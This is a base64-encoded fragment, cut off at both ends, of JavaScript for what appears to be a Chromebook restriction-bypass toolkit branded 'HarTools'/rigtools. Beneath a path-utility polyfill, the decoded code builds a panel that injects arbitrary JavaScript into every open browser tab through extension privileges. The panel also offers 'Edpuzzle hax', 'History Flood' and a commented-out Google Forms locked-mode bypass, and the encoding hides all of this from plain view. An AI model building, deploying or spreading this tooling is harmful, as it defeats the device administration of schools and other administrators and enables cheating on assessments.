VuZCAtIHRvU3RhcnQ7CgogICAgICAgIHZhciBsZW5ndGggPSBmcm9tTGVuIDwgdG9MZW4gPyBmcm9tTGVuIDogdG9MZW47CiAgICAgICAgdmFyIGxhc3RDb21tb25TZXAgPSAtMTsKICAgICAgICB2YXIgaSA9IDA7CiAgICAgICAgZm9yICg7IGkgPD0gbGVuZ3RoOyArK2kpIHsKICAgICAgICAgICAgaWYgKGkgPT09IGxlbmd0aCkgewogICAgICAgICAgICAgICAgaWYgKHRvTGVuID4gbGVuZ3RoKSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKHRvLmNoYXJDb2RlQXQodG9TdGFydCArIGkpID09PSA0NykgewoKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHRvLnNsaWNlKHRvU3RhcnQgKyBpICsgMSk7CiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmIChpID09PSAwKSB7CgogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gdG8uc2xpY2UodG9TdGFydCArIGkpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoZnJvbUxlbiA+IGxlbmd0aCkgewogICAgICAgICAgICAgICAgICAgIGlmIChmcm9tLmNoYXJDb2RlQXQoZnJvbVN0YXJ0ICsgaSkgPT09IDQ3KSB7CgogICAgICAgICAgICAgICAgICAgICAgICBsYXN0Q29tbW9uU2VwID0gaTsKICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKGkgPT09IDApIHsKCiAgICAgICAgICAgICAgICAgICAgICAgIGxhc3RDb21tb25TZXAgPSAwOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHZhciBmcm9tQ29kZSA9IGZyb20uY2hhckNvZGVBdChmcm9tU3RhcnQgKyBpKTsKICAgICAgICAgICAgdmFyIHRvQ29kZSA9IHRvLmNoYXJDb2RlQXQodG9TdGFydCArIGkpOwogICAgICAgICAgICBpZiAoZnJvbUNvZGUgIT09IHRvQ29kZSkKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBlbHNlIGlmIChmcm9tQ29kZSA9PT0gNDcpCiAgICAgICAgICAgICAgICBsYXN0Q29tbW9uU2VwID0gaTsKICAgICAgICB9CiAgICAgICAgdmFyIG91dCA9ICcnOwoKICAgICAgICBmb3IgKGkgPSBmcm9tU3RhcnQgKyBsYXN0Q29tbW9uU2VwICsgMTsgaSA8PSBmcm9tRW5kOyArK2kpIHsKICAgICAgICAgICAgaWYgKGkgPT09IGZyb21FbmQgfHwgZnJvbS5jaGFyQ29kZUF0KGkpID09PSA0NykgewogICAgICAgICAgICAgICAgaWYgKG91dC5sZW5ndGggPT09IDApCiAgICAgICAgICAgICAgICAgICAgb3V0ICs9ICcuLic7CiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgb3V0ICs9ICcvLi4nOwogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBpZiAob3V0Lmxlbmd0aCA+IDApCiAgICAgICAgICAgIHJldHVybiBvdXQgKyB0by5zbGljZSh0b1N0YXJ0ICsgbGFzdENvbW1vblNlcCk7CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgIHRvU3RhcnQgKz0gbGFzdENvbW1vblNlcDsKICAgICAgICAgICAgaWYgKHRvLmNoYXJDb2RlQXQodG9TdGFydCkgPT09IDQ3KQogICAgICAgICAgICAgICAgKyt0b1N0YXJ0OwogICAgICAgICAgICByZXR1cm4gdG8uc2xpY2UodG9TdGFydCk7CiAgICAgICAgfQogICAgfSwKICAgIF9tYWtlTG9uZzogZnVuY3Rpb24gX21ha2VMb25nKHBhdGgpIHsKICAgICAgICByZXR1cm4gcGF0aDsKICAgIH0sCiAgICBkaXJuYW1lOiBmdW5jdGlvbiBkaXJuYW1lKHBhdGgpIHsKICAgICAgICBhc3NlcnRQYXRoKHBhdGgpOwogICAgICAgIGlmIChwYXRoLmxlbmd0aCA9PT0gMCkgcmV0dXJuICcuJzsKICAgICAgICB2YXIgY29kZSA9IHBhdGguY2hhckNvZGVBdCgwKTsKICAgICAgICB2YXIgaGFzUm9vdCA9IGNvZGUgPT09IDQ3OwogICAgICAgIHZhciBlbmQgPSAtMTsKICAgICAgICB2YXIgbWF0Y2hlZFNsYXNoID0gdHJ1ZTsKICAgICAgICBmb3IgKHZhciBpID0gcGF0aC5sZW5ndGggLSAxOyBpID49IDE7IC0taSkgewogICAgICAgICAgICBjb2RlID0gcGF0aC5jaGFyQ29kZUF0KGkpOwogICAgICAgICAgICBpZiAoY29kZSA9PT0gNDcpIHsKICAgICAgICAgICAgICAgIGlmICghbWF0Y2hlZFNsYXNoKSB7CiAgICAgICAgICAgICAgICAgICAgZW5kID0gaTsKICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSBlbHNlIHsKCiAgICAgICAgICAgICAgICBtYXRjaGVkU2xhc2ggPSBmYWxzZTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBpZiAoZW5kID09PSAtMSkgcmV0dXJuIGhhc1Jvb3QgPyAnLycgOiAnLic7CiAgICAgICAgaWYgKGhhc1Jvb3QgJiYgZW5kID09PSAxKSByZXR1cm4gJy8vJzsKICAgICAgICByZXR1cm4gcGF0aC5zbGljZSgwLCBlbmQpOwogICAgfSwKICAgIGJhc2VuYW1lOiBmdW5jdGlvbiBiYXNlbmFtZShwYXRoLCBleHQpIHsKICAgICAgICBpZiAoZXh0ICE9PSB1bmRlZmluZWQgJiYgdHlwZW9mIGV4dCAhPT0gJ3N0cmluZycpIHRocm93IG5ldyBUeXBlRXJyb3IoJyJleHQiIGFyZ3VtZW50IG11c3QgYmUgYSBzdHJpbmcnKTsKCiAgICAgICAgdmFyIHN0YXJ0ID0gMDsKICAgICAgICB2YXIgZW5kID0gLTE7CiAgICAgICAgdmFyIG1hdGNoZWRTbGFzaCA9IHRydWU7CiAgICAgICAgdmFyIGk7CiAgICAgICAgaWYgKGV4dCAhPT0gdW5kZWZpbmVkICYmIGV4dC5sZW5ndGggPiAwICYmIGV4dC5sZW5ndGggPD0gcGF0aC5sZW5ndGgpIHsKICAgICAgICAgICAgaWYgKGV4dC5sZW5ndGggPT09IHBhdGgubGVuZ3RoICYmIGV4dCA9PT0gcGF0aCkgcmV0dXJuICcnOwogICAgICAgICAgICB2YXIgZXh0SWR4ID0gZXh0Lmxlbmd0aCAtIDE7CiAgICAgICAgICAgIHZhciBmaXJzdE5vblNsYXNoRW5kID0gLTE7CiAgICAgICAgICAgIGZvciAoaSA9IHBhdGgubGVuZ3RoIC0gMTsgaSA+PSAwOyAtLWkpIHsKICAgICAgICAgICAgICAgIHZhciBjb2RlID0gcGF0aC5jaGFyQ29kZUF0KGkpOwogICAgICAgICAgICAgICAgaWYgKGNvZGUgPT09IDQ3KSB7CgogICAgICAgICAgICAgICAgICAgIGlmICghbWF0Y2hlZFNsYXNoKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHN0YXJ0ID0gaSArIDE7CiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKGZpcnN0Tm9uU2xhc2hFbmQgPT09IC0xKSB7CgogICAgICAgICAgICAgICAgICAgICAgICBtYXRjaGVkU2xhc2ggPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICAgICAgZmlyc3ROb25TbGFzaEVuZCA9IGkgKyAxOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBpZiAoZXh0SWR4ID49IDApIHsKCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChjb2RlID09PSBleHQuY2hhckNvZGVBdChleHRJZHgpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoLS1leHRJZHggPT09IC0xKSB7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZCA9IGk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZXh0SWR4ID0gLTE7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQgPSBmaXJzdE5vblNsYXNoRW5kOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmIChzdGFydCA9PT0gZW5kKSBlbmQgPSBmaXJzdE5vblNsYXNoRW5kOwogICAgICAgICAgICBlbHNlIGlmIChlbmQgPT09IC0xKSBlbmQgPSBwYXRoLmxlbmd0aDsKICAgICAgICAgICAgcmV0dXJuIHBhdGguc2xpY2Uoc3RhcnQsIGVuZCk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgZm9yIChpID0gcGF0aC5sZW5ndGggLSAxOyBpID49IDA7IC0taSkgewogICAgICAgICAgICAgICAgaWYgKHBhdGguY2hhckNvZGVBdChpKSA9PT0gNDcpIHsKCiAgICAgICAgICAgICAgICAgICAgaWYgKCFtYXRjaGVkU2xhc2gpIHsKICAgICAgICAgICAgICAgICAgICAgICAgc3RhcnQgPSBpICsgMTsKICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfSBlbHNlIGlmIChlbmQgPT09IC0xKSB7CgogICAgICAgICAgICAgICAgICAgIG1hdGNoZWRTbGFzaCA9IGZhbHNlOwogICAgICAgICAgICAgICAgICAgIGVuZCA9IGkgKyAxOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmIChlbmQgPT09IC0xKSByZXR1cm4gJyc7CiAgICAgICAgICAgIHJldHVybiBwYXRoLnNsaWNlKHN0YXJ0LCBlbmQpOwogICAgICAgIH0KICAgIH0sCiAgICBleHRuYW1lOiBmdW5jdGlvbiBleHRuYW1lKHBhdGgpIHsKICAgICAgICBhc3NlcnRQYXRoKHBhdGgpOwogICAgICAgIHZhciBzdGFydERvdCA9IC0xOwogICAgICAgIHZhciBzdGFydFBhcnQgPSAwOwogICAgICAgIHZhciBlbmQgPSAtMTsKICAgICAgICB2YXIgbWF0Y2hlZFNsYXNoID0gdHJ1ZTsKCiAgICAgICAgdmFyIHByZURvdFN0YXRlID0gMDsKICAgICAgICBmb3IgKHZhciBpID0gcGF0aC5sZW5ndGggLSAxOyBpID49IDA7IC0taSkgewogICAgICAgICAgICB2YXIgY29kZSA9IHBhdGguY2hhckNvZGVBdChpKTsKICAgICAgICAgICAgaWYgKGNvZGUgPT09IDQ3KSB7CgogICAgICAgICAgICAgICAgaWYgKCFtYXRjaGVkU2xhc2gpIHsKICAgICAgICAgICAgICAgICAgICBzdGFydFBhcnQgPSBpICsgMTsKICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmIChlbmQgPT09IC0xKSB7CgogICAgICAgICAgICAgICAgbWF0Y2hlZFNsYXNoID0gZmFsc2U7CiAgICAgICAgICAgICAgICBlbmQgPSBpICsgMTsKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoY29kZSA9PT0gNDYpIHsKCiAgICAgICAgICAgICAgICBpZiAoc3RhcnREb3QgPT09IC0xKQogICAgICAgICAgICAgICAgICAgIHN0YXJ0RG90ID0gaTsKICAgICAgICAgICAgICAgIGVsc2UgaWYgKHByZURvdFN0YXRlICE9PSAxKQogICAgICAgICAgICAgICAgICAgIHByZURvdFN0YXRlID0gMTsKICAgICAgICAgICAgfSBlbHNlIGlmIChzdGFydERvdCAhPT0gLTEpIHsKCiAgICAgICAgICAgICAgICBwcmVEb3RTdGF0ZSA9IC0xOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGlmIChzdGFydERvdCA9PT0gLTEgfHwgZW5kID09PSAtMSB8fAoKICAgICAgICAgICAgcHJlRG90U3RhdGUgPT09IDAgfHwKCiAgICAgICAgICAgIHByZURvdFN0YXRlID09PSAxICYmIHN0YXJ0RG90ID09PSBlbmQgLSAxICYmIHN0YXJ0RG90ID09PSBzdGFydFBhcnQgKyAxKSB7CiAgICAgICAgICAgIHJldHVybiAnJzsKICAgICAgICB9CiAgICAgICAgcmV0dXJuIHBhdGguc2xpY2Uoc3RhcnREb3QsIGVuZCk7CiAgICB9LAogICAgZm9ybWF0OiBmdW5jdGlvbiBmb3JtYXQocGF0aE9iamVjdCkgewogICAgICAgIGlmIChwYXRoT2JqZWN0ID09PSBudWxsIHx8IHR5cGVvZiBwYXRoT2JqZWN0ICE9PSAnb2JqZWN0JykgewogICAgICAgICAgICB0aHJvdyBuZXcgVHlwZUVycm9yKCdUaGUgInBhdGhPYmplY3QiIGFyZ3VtZW50IG11c3QgYmUgb2YgdHlwZSBPYmplY3QuIFJlY2VpdmVkIHR5cGUgJyArIHR5cGVvZiBwYXRoT2JqZWN0KTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuIF9mb3JtYXQoJy8nLCBwYXRoT2JqZWN0KTsKICAgIH0sCiAgICBwYXJzZTogZnVuY3Rpb24gcGFyc2UocGF0aCkgewogICAgICAgIGFzc2VydFBhdGgocGF0aCk7CiAgICAgICAgdmFyIHJldCA9IHsKICAgICAgICAgICAgcm9vdDogJycsCiAgICAgICAgICAgIGRpcjogJycsCiAgICAgICAgICAgIGJhc2U6ICcnLAogICAgICAgICAgICBleHQ6ICcnLAogICAgICAgICAgICBuYW1lOiAnJwogICAgICAgIH07CiAgICAgICAgaWYgKHBhdGgubGVuZ3RoID09PSAwKSByZXR1cm4gcmV0OwogICAgICAgIHZhciBjb2RlID0gcGF0aC5jaGFyQ29kZUF0KDApOwogICAgICAgIHZhciBpc0Fic29sdXRlID0gY29kZSA9PT0gNDc7CiAgICAgICAgdmFyIHN0YXJ0OwogICAgICAgIGlmIChpc0Fic29sdXRlKSB7CiAgICAgICAgICAgIHJldC5yb290ID0gJy8nOwogICAgICAgICAgICBzdGFydCA9IDE7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgc3RhcnQgPSAwOwogICAgICAgIH0KICAgICAgICB2YXIgc3RhcnREb3QgPSAtMTsKICAgICAgICB2YXIgc3RhcnRQYXJ0ID0gMDsKICAgICAgICB2YXIgZW5kID0gLTE7CiAgICAgICAgdmFyIG1hdGNoZWRTbGFzaCA9IHRydWU7CiAgICAgICAgdmFyIGkgPSBwYXRoLmxlbmd0aCAtIDE7CgogICAgICAgIHZhciBwcmVEb3RTdGF0ZSA9IDA7CgogICAgICAgIGZvciAoOyBpID49IHN0YXJ0OyAtLWkpIHsKICAgICAgICAgICAgY29kZSA9IHBhdGguY2hhckNvZGVBdChpKTsKICAgICAgICAgICAgaWYgKGNvZGUgPT09IDQ3KSB7CgogICAgICAgICAgICAgICAgaWYgKCFtYXRjaGVkU2xhc2gpIHsKICAgICAgICAgICAgICAgICAgICBzdGFydFBhcnQgPSBpICsgMTsKICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmIChlbmQgPT09IC0xKSB7CgogICAgICAgICAgICAgICAgbWF0Y2hlZFNsYXNoID0gZmFsc2U7CiAgICAgICAgICAgICAgICBlbmQgPSBpICsgMTsKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoY29kZSA9PT0gNDYpIHsKCiAgICAgICAgICAgICAgICBpZiAoc3RhcnREb3QgPT09IC0xKSBzdGFydERvdCA9IGk7CiAgICAgICAgICAgICAgICBlbHNlIGlmIChwcmVEb3RTdGF0ZSAhPT0gMSkgcHJlRG90U3RhdGUgPSAxOwogICAgICAgICAgICB9IGVsc2UgaWYgKHN0YXJ0RG90ICE9PSAtMSkgewoKICAgICAgICAgICAgICAgIHByZURvdFN0YXRlID0gLTE7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgaWYgKHN0YXJ0RG90ID09PSAtMSB8fCBlbmQgPT09IC0xIHx8CgogICAgICAgICAgICBwcmVEb3RTdGF0ZSA9PT0gMCB8fAoKICAgICAgICAgICAgcHJlRG90U3RhdGUgPT09IDEgJiYgc3RhcnREb3QgPT09IGVuZCAtIDEgJiYgc3RhcnREb3QgPT09IHN0YXJ0UGFydCArIDEpIHsKICAgICAgICAgICAgaWYgKGVuZCAhPT0gLTEpIHsKICAgICAgICAgICAgICAgIGlmIChzdGFydFBhcnQgPT09IDAgJiYgaXNBYnNvbHV0ZSkgcmV0LmJhc2UgPSByZXQubmFtZSA9IHBhdGguc2xpY2UoMSwgZW5kKTsKICAgICAgICAgICAgICAgIGVsc2UgcmV0LmJhc2UgPSByZXQubmFtZSA9IHBhdGguc2xpY2Uoc3RhcnRQYXJ0LCBlbmQpOwogICAgICAgICAgICB9CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgaWYgKHN0YXJ0UGFydCA9PT0gMCAmJiBpc0Fic29sdXRlKSB7CiAgICAgICAgICAgICAgICByZXQubmFtZSA9IHBhdGguc2xpY2UoMSwgc3RhcnREb3QpOwogICAgICAgICAgICAgICAgcmV0LmJhc2UgPSBwYXRoLnNsaWNlKDEsIGVuZCk7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICByZXQubmFtZSA9IHBhdGguc2xpY2Uoc3RhcnRQYXJ0LCBzdGFydERvdCk7CiAgICAgICAgICAgICAgICByZXQuYmFzZSA9IHBhdGguc2xpY2Uoc3RhcnRQYXJ0LCBlbmQpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldC5leHQgPSBwYXRoLnNsaWNlKHN0YXJ0RG90LCBlbmQpOwogICAgICAgIH0KICAgICAgICBpZiAoc3RhcnRQYXJ0ID4gMCkgcmV0LmRpciA9IHBhdGguc2xpY2UoMCwgc3RhcnRQYXJ0IC0gMSk7CiAgICAgICAgZWxzZSBpZiAoaXNBYnNvbHV0ZSkgcmV0LmRpciA9ICcvJzsKICAgICAgICByZXR1cm4gcmV0OwogICAgfSwKICAgIHNlcDogJy8nLAogICAgZGVsaW1pdGVyOiAnOicsCiAgICB3aW4zMjogbnVsbCwKICAgIHBvc2l4OiBudWxsCn07CmNvbnN0IHNsaWRlcyA9IFtdOwpsZXQgYWN0aXZlU2xpZGVJZHggPSAwOwpjb25zdCBoYW5kbGVDYWxsYmFja3NfID0gW107CmNvbnN0IFdBSVRfRk9SX0ZJTklTSCA9IDE7CnJlcXVlc3RBbmltYXRpb25GcmFtZShmdW5jdGlvbiBhKHQpIHsKICAgIGZvciAoY29uc3QgY2Igb2YgaGFuZGxlQ2FsbGJhY2tzXykgewogICAgICAgIGxldCBtOwogICAgICAgIGlmICgobSA9IGNiLmYuYXBwbHkobnVsbCwgW3QgLSBjYi50XSkpKSB7CiAgICAgICAgICAgIGlmIChtID09PSAxKSB7CiAgICAgICAgICAgICAgICByZXR1cm47CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBoYW5kbGVDYWxsYmFja3NfLnNwbGljZShoYW5kbGVDYWxsYmFja3NfLmluZGV4T2YoY2IpLCAxKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KICAgIHJlcXVlc3RBbmltYXRpb25GcmFtZShhKTsKfSk7CmNvbnN0IGhhbmRsZUluQW5pbWF0aW9uRnJhbWUgPSAoY2IsIHRoaXogPSBudWxsLCBhcmdzID0gW10pID0+IHsKICAgIGhhbmRsZUNhbGxiYWNrc18ucHVzaCh7CiAgICAgICAgZjogY2IsCiAgICAgICAgdDogcGVyZm9ybWFuY2Uubm93KCksCiAgICB9KTsKfTsKCmNsYXNzIERlZmF1bHRFeHRlbnNpb25DYXBhYmlsaXRpZXMgewogICAgc3RhdGljIHRlbXBsYXRlID0gYAogIDx0aXRsZT5VbnRpdGxlZCBkb2N1bWVudDwvdGl0bGU+CiAgPGxpbmsgcmVsPSJpY29uIiB0eXBlPSJpbWFnZS94LWljb24iIGhyZWY9Imh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9jcm9zc2pibHkvSGFyVG9vbHMtcmlndG9vbHMxMjhwbHVzL3JlZnMvaGVhZHMvbWFpbi9kb2NzLmljbyI+CiAgPGRpdiBpZD0iZXh0X2RlZmF1bHQiPgogICAgPGRpdiBpZD0iZGVmYXVsdF9leHRlbnNpb25fY2FwYWJpbGl0aWVzIj4KICAgICAgPGRpdiBjbGFzcz0iaGVhZGVyIj4KICAgICAgICA8aW1nIHNyYz0iaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Nyb3NzamJseS9IYXJUb29scy1yaWd0b29sczEyOHBsdXMvcmVmcy9oZWFkcy9tYWluL2hhcnRvb2xzLmdpZiIgYWx0PSJIYXJUb29scyBMb2dvIiBjbGFzcz0ibG9nbyIgLz4KICAgICAgICA8aDE+IERlZmF1bHQgRXh0ZW5zaW9uIENhcGFiaWxpdGllcyA8L2gxPgogICAgICA8L2Rpdj4KICAgICAgPGRpdiBpZD0idGFicy1idXR0b25zIj4KICAgICAgICA8cD5PbiB0YWIgdXBkYXRlPC9wPgogICAgICAgIDxkaXYgaWQ9InRvZ2dsZWFibGUtYnV0dG9ucyI+IAoJCTx3aGl0ZWJ1dHRvbnM+CiAgICAgICAgICA8YnV0dG9uIGlkPSJlcnVkYSI+RXJ1ZGE8L2J1dHRvbj4KICAgICAgICAgIDxidXR0b24gaWQ9ImNoaWkiPkNoaWk8L2J1dHRvbj4KICAgICAgICAgIDxidXR0b24gaWQ9ImFkYmxvY2siPkFkYmxvY2s8L2J1dHRvbj4KICAgICAgICAgIDxidXR0b24gaWQ9ImVkcHV6emxlIj5FZHB1enpsZSBoYXg8L2J1dHRvbj4KICAgICAgICAgIDwhLS0gPGJ1dHRvbiBpZD0iZ2xvY2tlZCI+R2Zvcm1zIExvY2tlZCBNb2RlIGJ5cGFzczwvYnV0dG9uPiAtLT4KCQk8L3doaXRlYnV0dG9ucz4KICAgICAgICA8L2Rpdj4KICAgICAgPC9kaXY+CiAgICAgIDxkaXYgaWQ9Im90aGVyLWJ1dHRvbnMiPgogICAgICAgIDxwPk90aGVyIHNjcmlwdHM8L3A+CgkJPHdoaXRlYnV0dG9ucz4KICAgICAgICA8YnV0dG9uIGlkPSJzd2FtcCI+U3dhbXA8L2J1dHRvbj4KICAgICAgICA8YnV0dG9uIGlkPSJ1cGRhdGUiPlVwZGF0ZSBIYXJ0b29sczwvYnV0dG9uPgogICAgICAgIDxidXR0b24gaWQ9InF1aWNrLXJtdi1ibHQiPlF1aWNrIFJlbW92ZSBCbG9hdCAodXNlZCB3LyBnZm9ybXMgZXh0ZW4pPC9idXR0b24+CiAgICAgICAgPGJ1dHRvbiBpZD0iaHN0ZmxkIj5IaXN0b3J5IEZsb29kPC9idXR0b24+CgkJPC93aGl0ZWJ1dHRvbnM+CiAgICAgIDwvZGl2PgogICAgICA8aDI+RXZhbHVhdGUgY29kZTwvaDE+CiAgICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgICAgICAgIDx0ZXh0YXJlYSBpZD0iY29kZSIgcGxhY2Vob2xkZXI9IkVudGVyIEphdmFTY3JpcHQgdG8gaW5qZWN0Ij48L3RleHRhcmVhPgogICAgICAgIDwvZGl2PgogICAgICAgIDxidXR0b24gaWQ9ImNvZGUtcnVuIj5SdW48L2J1dHRvbj4KICAgICAgICA8ZGl2IGlkPSJjb2RlLW91dHB1dCI+PC9kaXY+CgogICAgPC9kaXY+CiAgICA8ZGl2IGlkPSJleHRlbnNpb25fdGFic19kZWZhdWx0Ij4KICAgICAgPGJ1dHRvbiBpZD0idGFicmVsb2FkIj5SZWZyZXNoIFRhYnM8L2J1dHRvbj4KICAgICAgPHVsPgogICAgICA8L3VsPgogICAgICA8aW5wdXQgaWQ9IlRhYlVSTElucHV0Ii8+IDxidXR0b24gaWQ9IlRhYlVSTFN1Ym1pdCI+Q3JlYXRlPC9idXR0b24+CiAgICA8L2Rpdj4KICA8L2Rpdj4KICBgOwogICAgdXBkYXRlVGFiTGlzdCgpIHsKICAgICAgICBpZiAodGhpcy5kaXNhcm1lZCkgewogICAgICAgICAgICByZXR1cm47CiAgICAgICAgfQoKICAgICAgICBpZiAodGhpcy50YWJMaXN0SW5Qcm9ncmVzcykgewoKICAgICAgICAgICAgcmV0dXJuOwogICAgICAgIH0KICAgICAgICB0aGlzLnRhYkxpc3RJblByb2dyZXNzID0gdHJ1ZTsKCiAgICAgICAgY29uc3QgdGFibGlzdCA9IGRvY3VtZW50LmJvZHkucXVlcnlTZWxlY3RvcigiI2V4dGVuc2lvbl90YWJzX2RlZmF1bHQgdWwiKTsKCiAgICAgICAgdGFibGlzdC5pbm5lckhUTUwgPSAiIjsKICAgICAgICBjb25zdCB0aGl6ID0gdGhpczsKICAgICAgICBjaHJvbWUud2luZG93cy5nZXRBbGwoZnVuY3Rpb24od2luKSB7CiAgICAgICAgICAgIHdpbi5mb3JFYWNoKGZ1bmN0aW9uKHYpIHsKICAgICAgICAgICAgICAgIGNocm9tZS50YWJzLnF1ZXJ5KHsKICAgICAgICAgICAgICAgICAgICB3aW5kb3dJZDogdi5pZAogICAgICAgICAgICAgICAgfSwgZnVuY3Rpb24odGFiSW5mb3MpIHsKICAgICAgICAgICAgICAgICAgICB0YWJJbmZvcy5mb3JFYWNoKGZ1bmN0aW9uKGluZm8pIHsKICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgZGl2ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CiAgICAgICAgICAgICAgICAgICAgICAgIGRpdi5jbGFzc05hbWUgPSAidGFibGlzdC1pdGVtIjsKICAgICAgICAgICAgICAgICAgICAgICAgZGl2LmlubmVySFRNTCA9IGA8aW1nICR7CiAgICAgICAgICAgICAgY2hyb21lLnRhYnMgJiYgKGluZm8uZmF2SWNvblVybD8ubGVuZ3RoID8/IDApID4gMAogICAgICAgICAgICAgICAgPyBgc3JjPSIke2luZm8uZmF2SWNvblVybH0iYAogICAgICAgICAgICAgICAgOiAiIgogICAgICAgICAgICB9Lz48c3BhbiBjbGFzcz0idGFiLW5hbWUiPiR7aW5mby50aXRsZX0gPGxpdHN0dWZmPiAke2luZm8udXJsfTxsaXRzdHVmZj48L3NwYW4+YDsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGNocm9tZS5zY3JpcHRpbmcgfHwgY2hyb21lLnRhYnMuZXhlY3V0ZVNjcmlwdCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgcnVuQnV0dG9uID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiYnV0dG9uIik7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBydW5CdXR0b24udGV4dENvbnRlbnQgPSAiUnVuIjsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJ1bkJ1dHRvbi5vbmNsaWNrID0gKCkgPT4gcnVuQ29kZSh0cnVlLCBpbmZvLmlkKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRpdi5hcHBlbmRDaGlsZChydW5CdXR0b24pOwogICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBwcmV2aWV3QnV0dG9uID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiYnV0dG9uIik7CiAgICAgICAgICAgICAgICAgICAgICAgIHByZXZpZXdCdXR0b24udGV4dENvbnRlbnQgPSAiUHJldmlldyI7CgogICAgICAgICAgICAgICAgICAgICAgICBwcmV2aWV3QnV0dG9uLm9uY2xpY2sgPSAoKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aGl6LmRpc2FybSA9IHRydWU7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGhpei5wcmV2aWV3aW5nID0gdHJ1ZTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHJvbWUud2luZG93cy51cGRhdGUoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW5mby53aW5kb3dJZCwgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb2N1c2VkOiB0cnVlLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNocm9tZS50YWJzLnVwZGF0ZShpbmZvLmlkLCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhY3RpdmU6IHRydWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpbmRvdy5jdXJyZW50VGltZW91dCA9IHNldFRpbWVvdXQoZnVuY3Rpb24gbSgpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGVhclRpbWVvdXQod2luZG93LmN1cnJlbnRUaW1lb3V0KTsKCiAgICAgICAgICAgICAgICAgICAgI